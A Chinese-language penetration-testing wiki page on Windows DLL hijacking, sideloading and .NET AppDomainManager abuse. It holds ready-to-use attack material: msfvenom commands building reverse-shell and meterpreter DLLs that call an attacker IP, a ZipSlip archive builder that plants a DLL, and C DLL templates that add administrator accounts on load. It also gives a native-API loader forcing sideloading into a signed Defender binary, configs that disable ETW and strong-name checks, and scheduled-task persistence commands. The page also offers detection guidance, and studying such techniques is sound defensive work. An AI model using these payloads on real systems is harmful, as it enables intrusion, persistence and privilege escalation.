# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 是指操纵受信任的应用程序加载恶意 DLL。这个术语涵盖多种策略，例如 **DLL Spoofing、Injection 和 Side-Loading**。它主要用于代码执行和实现持久化，较少用于权限提升。尽管这里侧重于权限提升，但无论目标是什么，劫持方法都相同。

### 常见技术

DLL Hijacking 有多种方法，效果取决于应用程序加载 DLL 的策略：<sup>[[4]](#references)</sup>

1. **DLL Replacement**：用恶意 DLL 替换正版 DLL；也可以使用 DLL Proxying 来保留原 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在搜索路径中，位置先于正版 DLL，从而利用应用程序的搜索顺序。
3. **Phantom DLL Hijacking**：为应用程序创建恶意 DLL，使其加载该 DLL，并误以为它是所需但不存在的 DLL。
4. **DLL Redirection**：修改 `%PATH%` 或 `.exe.manifest` / `.exe.local` 等搜索参数，将应用程序指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换正版 DLL，这种方法通常与 DLL side-loading 有关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与复制的应用程序位于同一目录的用户可控目录中，类似于 Binary Proxy Execution 技术。

应用程序也可以实现自己的 **DLL loader**。特权进程可能会枚举 `Libraries` 或 `Plugins` 等子目录，并将选定的 DLL 传递给辅助程序，这一过程独立于 Windows 的常规 DLL 搜索顺序。如果其他帐户能够在该特定目录中创建文件，应将其视为需要进一步审查的线索：确认进程身份、目录的有效 ACL、文件选择规则，以及是否存在可触发的加载操作。可写的可执行文件旁边目录，并不能证明进程会从该目录加载 DLL。

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### 安装后 PE import grafting

传统的 side-loading 会保留受信任 PE 不变，并通过 DLL 名称解析来实现劫持。**Import grafting** 则会修改受信任程序已加载的 PE。攻击者会为攻击者控制的 DLL 添加一个 import descriptor 及相关的 lookup/IAT 条目。当 Windows 递归解析该依赖项时，会映射新增的 DLL，并在原本合法的进程中运行其初始化代码。这属于对磁盘上的 PE 进行修改，与在运行时将实时 IAT 函数指针替换为 hook 并非同一操作。<sup>[[31]](#references)[[32]](#references)</sup>

被修改的 PE 可以是中间供应商 DLL，而不是用户或 Task Scheduler 启动的可执行文件。可复用的攻击链如下：<sup>[[32]](#references)</sup>

1. 将正版可执行文件及其依赖项复制到攻击者控制的目录。
2. 修改其中一个依赖项的 import 结构，使其引用恶意 DLL，同时保留该依赖项预期导出的函数和正常行为。
3. 配置 autorun 或 scheduled task 来启动正版可执行文件。loader 会映射被篡改的依赖项，随后加载新增的 DLL。有关任务枚举，请参阅 [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks)。
4. 避免在 `DllMain` 中执行耗时操作；观察到的 loader 创建了一个 worker thread，并在其中继续执行分阶段解密。

如果供应商的软件包本身是干净的，而 import 修改发生在安装后，那么这与供应商侧的 supply-chain compromise 不同。应对暂存目录中的每个模块进行排查，而不仅仅是 host EXE：将依赖项的 import 列表和哈希与已知正常的安装进行比较，验证签名，并调查从意外的可写位置（例如 `C:\ProgramData`）启动的供应商二进制文件。指向此类目录中已复制 crash reporter 或 updater 的 scheduled task，是一个特别有用的调查切入点。<sup>[[32]](#references)</sup>


### AppDomainManager hijacking（`<exe>.config` + 攻击者程序集）

Classic DLL sideloading 并不是让受信任的 **.NET Framework** 进程加载攻击者代码的唯一方法。如果目标可执行文件是一个 **managed** 应用程序，CLR 还会查找以可执行文件命名的 **application configuration file**（例如 `Setup.exe.config`）。该文件可以定义自定义的 **AppDomainManager**。如果配置文件指向放在 EXE 旁边的攻击者控制程序集，CLR 就会在应用程序正常代码路径运行之前加载该程序集，并在受信任进程中运行。<sup>[[24]](#references)</sup>

根据 Microsoft 的 .NET Framework 配置架构，必须同时提供 `<appDomainManagerAssembly>` 和 `<appDomainManagerType>`，自定义 manager 才会生效。<sup>[[16]](#references)[[17]](#references)</sup>

最简配置：

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

最小管理器：

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

实用说明：
- 这是 **特定于 .NET Framework** 的 tradecraft。它依赖 CLR 配置解析，而不是 Win32 DLL search order。
- 主机必须确实是 **managed EXE**。快速排查：运行 `sigcheck -m target.exe`、`corflags target.exe`，或检查 PE 元数据中的 **CLR Runtime Header**。
- 配置文件名必须与可执行文件名完全匹配（`<binary>.config`），通常位于 **EXE 旁边**。
- 这适用于 **已签名的 Microsoft/供应商二进制文件**，因为可信 EXE 保持不变，而恶意 managed assembly 会在进程内执行。
- 如果你已经有可写的安装程序/更新目录，可以将 AppDomainManager hijacking 用作 **第一阶段**，再通过传统 DLL sideloading 或 reflective loading 执行后续阶段。

### 将 AppDomainManager 用作下载器和 scheduled-task 引导程序

一种实用的入侵模式是将可信 managed EXE 与恶意 `*.config` 和恶意 AppDomainManager DLL 配合使用；该 DLL 仅充当一个**小型引导程序**：<sup>[[25]](#references)</sup>

1. 用户从可信的位置（例如 `%USERPROFILE%\Downloads`）启动已签名的 .NET 安装程序或更新程序。
2. 同目录下的配置文件会使 CLR 在合法应用逻辑开始前**加载攻击者的程序集**。
3. 恶意 manager 执行**路径门控**（例如，仅当主机 EXE 从 `Downloads` 运行时才继续，并且仅允许第二阶段从 `%LOCALAPPDATA%` 运行）。
4. 如果检查通过，它会将真实 payload 下载到用户可写路径（例如 `%LOCALAPPDATA%\PerfWatson2.exe`），并通过 scheduled task 建立 persistence。

此变体的重要性：
- 已签名的主机 EXE 保持不变，因此只对主二进制文件进行哈希检查的初步排查可能会漏掉此次入侵。
- 简单的**基于路径的反分析**很常见：将 ZIP/EXE/DLL 三件套移至 Desktop、Temp 或 sandbox 路径，可能会有意中断整个链条。
- 第一阶段的 AppDomainManager DLL 可以保持小巧且低噪声，之后再下载真正的 implant。

此模式中常见的最简 persistence 示例：

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

备注：
- ` /rl highest` 表示该用户/会话**可用的最高权限**；它本身并不保证提权到 SYSTEM。
- 这种技术通常更适合归类为**通过滥用 .NET 配置实现执行/持久化**，而不是经典的缺失 DLL 搜索顺序劫持，尽管操作者经常将两者结合使用。

检测切入点：
- 从 **ZIP 解压路径**、`Downloads`、`%TEMP%` 或其他用户可写文件夹启动的已签名 .NET 可执行文件，旁边还存在同名的 `<exe>.config` 文件。
- 新建的计划任务，其操作指向 `%LOCALAPPDATA%`、`%APPDATA%` 或 `Downloads`，且任务名称仿冒浏览器/厂商更新程序。
- 短暂运行的托管引导进程会立即下载另一个 EXE，然后启动 `schtasks.exe`。
- 除非可执行文件路径符合预期的用户配置文件目录，否则会提前退出的样本。

### 劫持现有计划任务以重新启动侧加载链

要实现持久化，不要只查找**新建任务**。有些入侵组织会等待合法安装程序创建**正常的更新程序任务**，然后**改写任务操作**，这样已有的任务名称、作者和触发器对防御人员来说仍然显得熟悉。

可复用的工作流：
1. 安装/运行合法软件，并找出它通常创建的任务。
2. 导出任务 XML，并记录当前的 `<Exec><Command>` / `<Arguments>` 值。<sup>[[23]](#references)</sup>
3. 只替换操作，使任务从用户可写的暂存目录启动你的**可信宿主 EXE**，然后由它侧加载或通过 AppDomain 加载真实 payload。
4. 重新注册相同的任务名称，而不是创建一个明显的新持久化工件。

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

为什么更隐蔽：
- 任务名称仍然可以看起来很合法（例如供应商更新程序）。
- 它由 **Task Scheduler 服务**启动，因此父进程/祖先进程验证通常会看到预期的调度链，而不是 `explorer.exe`。
- 只查找**新任务名称**的 DFIR 团队可能会漏掉这类任务：任务注册早已存在，但其操作现在指向 `%LOCALAPPDATA%`、`%APPDATA%` 或其他攻击者控制的路径。

快速狩猎切入点：
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- 将 `C:\Windows\System32\Tasks\*` XML 和 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` 元数据与基线进行比较。
- 当**看起来像供应商更新程序的任务**从**用户可写目录**执行，或启动旁边带有 `*.config` 文件的 .NET EXE 时发出告警。

> [!TIP]
> 如需了解一个逐步展开的攻击链，展示如何在 DLL sideloading 之上叠加 HTML staging、AES-CTR configs 和 .NET implants，请查看下面的工作流。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### 将 side-loaded stage 与服务命令行绑定

side-loaded DLL 可能不只要求主机 EXE 和 DLL 名称符合预期。Mandiant 描述过一种 loader，它会将 payload 解密与命令行参数及其主机可执行文件名称绑定。<sup>[[33]](#references)</sup> 在后续一条由服务支持的攻击链中，复制来的合法主机加载了相邻的 `mscoree.dll`，该 DLL 导出了 `LockClrVersion`，并且只有在从服务参数和主机可执行文件的基本名称派生出 AES-128 密钥后，才会解密其内嵌的 stage。每项输入都会截断或用 NUL 填充至 16 字节；逐字节密钥为 `argument XOR embedded_key XOR executable_basename`，随后使用 AES-CBC 且不进行填充来解密 payload。即使 DLL 仍能加载，重命名主机或在未提供预期参数的情况下启动它，都会改变密钥并阻止该 stage 解密。复现或分析此变体时，请保留准确的命令行参数和基本名称。<sup>[[34]](#references)</sup>

这是**叠加在常规 DLL side-loading 之上的 payload gate**，并不是新的 DLL 搜索顺序规则，也不是独立的提权原语。服务的安全上下文决定最终的权限级别。[GitHub issue/file C2 工作流](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md)另行记录了后续传输方式。<sup>[[34]](#references)</sup>

## 查找缺失的 DLL

在系统中查找缺失 DLL 最常见的方法，是运行 sysinternals 的 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，并**设置以下 2 个筛选器**：

![常见技术 - 查找缺失的 DLL：在系统中查找缺失 DLL 最常见的方法，是运行 sysinternals 的 procmon，并设置以下 2 个筛选器](<../../../images/image (961).png>)

![常见技术 - 查找缺失的 DLL：在系统中查找缺失 DLL 最常见的方法，是运行 sysinternals 的 procmon，并设置以下 2 个筛选器](<../../../images/image (230).png>)

然后只显示 **File System Activity**：

![常见技术 - 查找缺失的 DLL：然后只显示 File System Activity](<../../../images/image (153).png>)

如果要查找**一般情况下缺失的 DLL**，就让它运行**几秒钟**。\
如果要查找**特定可执行文件中缺失的 DLL**，再设置一个筛选器，例如 **"Process Name" "contains" `<exec name>`**，运行该程序，然后停止捕获事件。<sup>[[9]](#references)</sup>

## 利用缺失的 DLL

要提权，请查找**特权进程尝试从你可写入的位置加载的 DLL**。这种情况可能发生在你控制了一个搜索顺序早于合法 DLL 所在目录的目录时，也可能发生在请求的 DLL 不存在、而你可以写入某个被搜索目录时。

### DLL 搜索顺序

**你可以在** [**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中了解 DLL 的具体加载方式。**

**Windows 应用程序**会按照一组**预定义的搜索路径**，依照特定顺序查找 DLL。当恶意 DLL 被策略性地放入其中一个目录，并因此先于真实 DLL 加载时，就会出现 DLL hijacking。防止此问题的一种方法，是确保应用程序引用所需 DLL 时使用绝对路径。

下面是**32 位**系统上的 **DLL 搜索顺序**：

1. 应用程序加载所在的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取此目录的路径。(_C:\Windows\System32_)
3. 16 位系统目录。没有函数可以获取此目录的路径，但系统仍会搜索它。(_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取此目录的路径。
   1. (_C:\Windows_)
5. 当前目录。
6. PATH 环境变量中列出的目录。请注意，这不包括 **App Paths** 注册表项指定的每应用程序路径。计算 DLL 搜索路径时不会使用 **App Paths** 项。

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。禁用该模式时，当前目录会升至第二位。要禁用此功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值，并将其设为 0（默认启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数时使用了 **LOAD_WITH_ALTERED_SEARCH_PATH**，搜索将从 **LoadLibraryEx** 正在加载的可执行模块所在目录开始。

最后，也可以使用绝对路径而非名称加载 DLL。在这种情况下，Windows 只会在该路径查找 DLL 本身；按名称请求的依赖项仍遵循适用的搜索顺序。

还有其他可以更改搜索顺序的方法，但这里不作说明。

### 将任意文件写入利用链串接到缺失 DLL hijack

**相关技术：** [针对特权修复操作的 oplock 门控挂载点切换](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation)。

1. 使用 **ProcMon** 筛选器（`Process Name` = 目标 EXE，`Path` ends with `.dll`，`Result` = `NAME NOT FOUND`），收集该进程探测但找不到的 DLL 名称。<sup>[[14]](#references)</sup>
2. 如果该二进制文件按**计划运行/作为服务运行**，将具有这些名称之一的 DLL 放入**应用程序目录**（搜索顺序第 #1 项），它就会在下次执行时加载。在一个 .NET scanner 案例中，进程先在 `C:\samples\app\` 中查找 `hostfxr.dll`，之后才从 `C:\Program Files\dotnet\fxr\...` 加载真正的副本。
3. 构建一个 payload DLL（例如 reverse shell），并添加任意导出函数：`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. 如果你的原语是 **ZipSlip 风格的任意写入**，构造一个 ZIP 文件，使其中的条目逃逸出解压目录，从而让 DLL 落在应用程序文件夹中：

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. 将压缩包放入受监视的 inbox/share；当计划任务重新启动进程时，它会加载恶意 DLL，并以服务账户身份执行你的代码。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

在创建新进程时，使用 ntdll 的原生 API 设置 RTL_USER_PROCESS_PARAMETERS 中的 DllPath 字段，是一种高级且确定性地影响 DLL 搜索路径的方法。在此处提供攻击者控制的目录后，如果目标进程按名称解析导入的 DLL（不使用绝对路径，也不使用安全加载标志），就可以强制它从该目录加载恶意 DLL。

核心思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向受你控制文件夹的自定义 DllPath（例如 dropper/unpacker 所在目录）。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器会在解析过程中查询此处提供的 DllPath，从而可靠地实现 sideloading，即使恶意 DLL 与目标 EXE 不在同一目录中也可以。

注意事项/限制
- 这会影响正在创建的子进程；这与只影响当前进程的 SetDllDirectory 不同。
- 目标必须按名称导入 DLL 或调用 LoadLibrary（不使用绝对路径，也不使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能会改变搜索优先级。

最简 C 示例（ntdll、宽字符串、简化的错误处理）：

<details>
<summary>完整 C 示例：通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 DLL sideloading</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

操作用法示例
- 将恶意的 xmllite.dll（导出所需函数或代理到真实 DLL）放入你的 DllPath 目录。
- 使用上述技术启动一个已知会按名称查找 xmllite.dll 的签名二进制文件。加载器会通过指定的 DllPath 解析导入项，并 sideload 你的 DLL。

实际攻击中曾观察到该技术用于构建多阶段 sideloading 链：初始 launcher 放置一个辅助 DLL，随后该 DLL 启动一个经过 Microsoft 签名且可被劫持的二进制文件，并为其设置自定义 DllPath，以强制从 staging 目录加载攻击者的 DLL。<sup>[[6]](#references)</sup>


### 通过 `.exe.config` 劫持 .NET AppDomainManager

对于 **.NET Framework** 目标，可以利用应用程序旁边的 **`.exe.config`** 文件，在 **`Main()`** 执行前进行 sideloading，而无需修补内存。攻击者不再只依赖 Win32 DLL 搜索顺序，而是将合法的 .NET EXE 与恶意配置文件以及一个或多个由攻击者控制的程序集放在一起。

攻击链的工作方式：<sup>[[15]](#references)[[22]](#references)</sup>
1. 宿主 EXE 启动，**CLR 读取 `<exe>.config`**。
2. 配置文件设置 **`<appDomainManagerAssembly>`** 和 **`<appDomainManagerType>`**，使运行时实例化由攻击者控制的 `AppDomainManager`。
3. 恶意管理器在受信任的宿主进程内获得 **`Main()` 执行前的执行机会**。
4. 同一配置文件可以强制 CLR 优先解析本地程序集（例如 `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`），并在不进行 inline patching 的情况下削弱运行时验证/遥测。

类似攻击活动中的模式（具体嵌套结构可能因指令/CLR 版本而异）：

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

为什么有用：
- **`<probing privatePath="."/>`** 将程序集解析限制在应用程序目录中，使该文件夹成为可预测的 sideloading 攻击面。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** 会在 CLR 初始化期间将执行流程转入攻击者代码，在合法应用逻辑运行之前执行。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** 可以让完全信任的应用加载未签名或被篡改的程序集，而不会因强名称验证失败。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** 可避免 publisher-policy 将程序集重定向到较新版本。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** 可使运行时选择更具确定性。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** 尤其值得关注，因为 **CLR 会通过配置禁用自身的 ETW 可见性**，而不需要 implant 在内存中 patch `EtwEventWrite`。

近期 campaign 中观察到的操作模式：
- Stage 1 投放 `setup.exe`、`setup.exe.config` 和本地程序集。
- Stage 2 将这些文件复制到看起来可信的 **AppData update** 文件夹中，将宿主重命名为类似 `update.exe` 的名称，然后通过 **scheduled task** 重新启动。
- Stage 3 在加载最终 RAT DLL/export 之前验证执行上下文（例如，确认预期的父进程是来自 Task Scheduler 的 `svchost.exe`）。

Hunting 思路：
- 在用户可写位置运行的、已签名或其他方面合法的 **.NET 可执行文件**，其旁边存在可疑的 **`.config`** 文件。
- 包含 **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`** 或 **`etwEnable enabled="false"`** 的 `.config` 文件。
- 通过 scheduled task 从 **`%LOCALAPPDATA%`** 或应用专用的 `\bin\update\` 目录重新启动重命名后的 update 二进制文件。
- 父子进程链中，scheduled task 启动受信任的 .NET 宿主，随后该宿主立即从自身目录加载非供应商程序集。

#### Windows 文档中 DLL 搜索顺序的例外情况

Windows 文档中指出了标准 DLL 搜索顺序的一些例外情况：

- 遇到与内存中已加载的 DLL **同名的 DLL** 时，系统会绕过常规搜索。系统会先检查重定向和 manifest，然后才回退到内存中已加载的 DLL。**在这种情况下，系统不会搜索该 DLL**。
- 如果 DLL 被识别为当前 Windows 版本的 **known DLL**，系统会使用其对应版本的 known DLL 及其所有依赖 DLL，**跳过搜索过程**。注册表项 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果某个 **DLL 有依赖项**，系统会按其**模块名**搜索这些依赖 DLL，无论最初的 DLL 是否通过完整路径指定。

### 提升权限

**要求**：

- 找到一个以**不同权限**运行或将要运行的进程（horizontal 或 lateral movement），并且该进程**缺少某个 DLL**。
- 确保对任何将被搜索以查找 **DLL** 的**目录**都具有**写入权限**。该位置可能是可执行文件所在目录，也可能是系统路径中的某个目录。

默认情况下，这些前提并不常见：具有特权的可执行文件通常不会缺少 DLL 依赖项，而标准用户通常无法写入系统搜索路径中的目录。不过，配置错误的环境仍可能同时暴露这两种情况。\
如果满足这些要求，请查看 [UACME](https://github.com/hfiref0x/UACME) 项目。虽然它的主要目标是 UAC bypass，但其中包含针对特定 Windows 版本的 DLL-hijacking PoCs，通常可以改编用于你发现的可写目录。

注意，你可以通过以下方式**检查自己对文件夹的权限**：<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

并**检查 PATH 中所有文件夹的权限**：

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

你还可以使用以下命令检查可执行文件的导入项和 DLL 的导出项：

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

要查看如何利用 **DLL Hijacking**，通过对 **System Path 文件夹**的写入权限来**提升权限**的完整指南，请查看：

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)会检查你是否拥有对 system PATH 中任意文件夹的写入权限。\
其他可用于发现此漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现了可利用的场景，成功利用它最重要的一点是**创建一个至少导出可执行文件会从中导入的所有函数的 dll**。无论如何，请注意，DLL Hijacking 可用于[从 Medium Integrity level 提升到 High **（绕过 UAC）**](../../authentication-credentials-uac-and-efs/index.html#uac)，或从[ **High Integrity 提升到 SYSTEM**](../index.html#from-high-integrity-to-system)**.** 你可以在这篇专注于通过 DLL hijacking 执行代码的研究文章中找到**如何创建有效 dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，你可以找到一些**基础 dll 代码**，可用作**模板**，或用于创建导出**非必需函数**的 **dll**。

## **创建和编译 DLL**

### **DLL Proxifying**

基本上，**DLL proxy** 是一种 DLL，它能够**在加载时执行你的恶意代码**，同时还能通过**将所有调用转发给真实库**，以预期方式**公开接口**并**正常工作**。

借助 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以**指定一个可执行文件并选择要进行 proxify 的库**，然后**生成一个 proxified dll**；也可以**指定 DLL** 并**生成一个 proxified dll**。

### **Meterpreter**

**获取反向 shell（x64）：**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**获取一个 meterpreter（x86）：**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**创建用户（我没看到 x64 版本）：**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 你自己的

在很多情况下，你编译的 DLL 必须**导出受害进程导入的每个函数**。如果缺少必需的导出项，二进制文件就无法解析该函数，导致 exploit 失败。

<details>
<summary>C DLL 模板（Win10）</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>带用户创建功能的 C++ DLL 示例</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>带线程入口的备用 C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### 由导出触发初始化的 NativeAOT DLL

